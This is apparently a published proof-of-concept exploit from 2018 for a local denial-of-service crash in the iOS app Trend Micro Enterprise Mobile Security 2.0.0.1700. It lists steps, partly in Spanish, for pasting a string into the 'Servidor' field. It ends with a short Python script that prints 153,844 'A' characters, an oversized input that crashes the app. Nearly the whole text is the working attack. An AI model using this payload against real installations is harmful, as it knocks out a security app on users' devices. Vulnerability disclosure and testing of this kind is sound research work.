# Exploit Title: Trend Micro Enterprise Mobile Security 2.0.0.1700 - 'Servidor' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2018-08-26
# Vendor Homepage: https://www.trendmicro.com/en_se/business/products/user-protection/sps/mobile.html
# Software Link: App Store for iOS devices
# Tested Version: 2.0.0.1700
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 11.4.1

# Steps to Produce the Crash:
# 1.- Run python code: Enterprise_Mobile_Security_2.0.0.1700.py
# 2.- Copy content to clipboard
# 3.- Open App Enterprise Mobile Security
# 4.- Inscribirse manualmente
# 5.- Servidor local
# 6.- Paste ClipBoard on "Servidor:"
# 7.- Puerto: 80
# 8.- Siguiente
# 9.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 153844
print (buffer)